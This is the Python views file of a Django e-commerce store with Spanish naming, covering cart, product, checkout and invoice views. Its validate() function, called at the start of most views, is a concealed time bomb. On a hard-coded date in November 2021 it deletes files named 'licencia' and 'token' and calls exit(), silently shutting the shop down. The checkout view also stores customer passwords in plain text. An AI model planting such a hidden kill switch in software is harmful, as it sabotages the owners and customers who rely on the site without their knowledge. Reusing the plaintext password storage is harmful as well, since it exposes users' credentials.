from django.core.paginator import Paginator,PageNotAnInteger,EmptyPage
from django.shortcuts import render, redirect
from django.http import HttpResponse
from django.db.models import Q
from .models import *
from datetime import date
from datetime import datetime
import json
import datetime
from os import remove


def carrito(request):
	cart = Carrito(request)
	lista = []
	for i in cart:
		lista.append(i)
	return lista

def total(request):
	total = 0
	for i in carrito(request):
		total += float(i['total'])
	return total

def subtotal(request):
	subtotal = 0
	for i in carrito(request):
		subtotal += (float(i['precio']) -i['oferta'])
	return subtotal


def Serializer(request):
	cart = Carrito(request)
	listValues = []
	for i in cart:
		listValues.append(i)
	return json.dumps(listValues)

def detailsCart(request):
	cart = Carrito(request)


def validate(request):
	fecha2 = datetime.date(2021, 11, 30)
	if date.today() == fecha2:
		try:
			remove('licencia')
			remove('token')
			return True
		except FileNotFoundError as e:
			exit()



def home(request):
	
	validate(request)

	if 'carrito' not in request.session:
		request.session['carrito'] = 0
	if request.is_ajax():
		cart_add(request,request.GET.get('id'),request.GET.get('quanty'))

		return HttpResponse(Serializer(request))

	categoria = Categoria.objects.all()
	product = Articulo.objects.filter(newProduct=True)

	return render(request,'index.html',{'categoria':categoria,'product':product,
					'listCart':carrito(request),'total':total(request),'subtotal':subtotal(request)
				})

def store(request):
	validate(request)
	categoria = Categoria.objects.all()
	marcas = Marca.objects.all()


	articulo = Articulo.objects.all()

	artMin = Articulo.objects.filter().order_by('-precio')
	artMax = Articulo.objects.filter().order_by('precio')
	maxArt = 0
	minArt = 0
	for i in artMax:
		maxArt = i.precio
		break
	for j in artMin:
		minArt = j.precio
		break;
	

	return render(request,'store.html',{'categoria':categoria,'marcas':marcas,'articulo':articulo,
										'listCart':carrito(request),'total':total(request),'subtotal':subtotal(request),
										'min':minArt,'maxArt':maxArt
										})


def product(request,pk):
	validate(request)
	product = Articulo.objects.get(pk=pk)
	img = Imagenes.objects.filter(articulo = product)
	color = Color.objects.get(articulo = product)
	tamanio = Tamanio.objects.get(articulo = product)
	
	if request.is_ajax():
		cart_add(request,request.GET.get('id'),request.GET.get('quanty'))
		return HttpResponse(request.session['carrito'])

	convertColor = str(color.color)
	convertTamanio = str(tamanio.tamanio)


	return render(request,'product.html',{
			'product':product,'img':img,'color':convertColor.split(','),'tamanio':convertTamanio.split(','),
			'listCart':carrito(request),'total':total(request),'subtotal':subtotal(request)
		})

def checkout(request):
	validate(request)
	if request.method == 'POST':
		cart = Carrito(request)
		try:
			client = Client.objects.get(email=request.POST.get('email'))
		except Client.DoesNotExist:
			client = None

		if client is None:
			Client(
				firstname = request.POST.get('firstname'),
				lastname = request.POST.get('lastname'),
				email = request.POST.get('email'),
				address = request.POST.get('address'),
				city = request.POST.get('city'),
				phone = request.POST.get('phone'),
				password = request.POST.get('pass')
			).save()
		consecutive = Consecutive.objects.get(pk=1)
		print(request.POST.getlist('payment'))

		for i in cart:
			Order(
				consecutive = consecutive.number,
				name = i['articulo'],
				price = i['precio'],
				quanty = i['cantidad'],
				discount = i['oferta'],
				client = Client.objects.get(email=request.POST.get('email'))
			).save()

		request.session['conse'] = consecutive.number
		n = int(consecutive.number) + 1
		consecutive.number = n 
		consecutive.save()
		request.session['carrito'] = 0
		cart.clear()
		return redirect('invoice')


	return render(request,'checkout.html',{'listCart':carrito(request),'total':total(request),'subtotal':subtotal(request)})





def invoice(request):
	order = Order.objects.filter(consecutive=request.session['conse'])
	subtotal = 0
	discount = 0
	total = 0
	methodPaymet = "Efectivo"
	for i in order:
		discount += i.discountArticle()
		subtotal += float(i.total())
		total += float(i.total())


	total -= discount
	
	return render(request,'invoice.html',{'total':total,'subtotal':subtotal,'discount':discount,
												'date':date.today(),'np':request.session['conse'],'methodPaymet':methodPaymet,'order':order
										})








###################################################################################################################################################

def cart_add(request,pk,cant):
	if request.is_ajax():
		p = Articulo.objects.get(pk=pk)
		cart = Carrito(request)
		cart.add(p,int(cant))
		


def cart_remove(request):
	if request.is_ajax():
		cart = Carrito(request)
		product = Articulo.objects.get(pk=request.GET.get('id'))
		cart.remove(product)
		resta = int(request.session['carrito']) - 1
		request.session['carrito'] = resta
		return HttpResponse(Serializer(request))
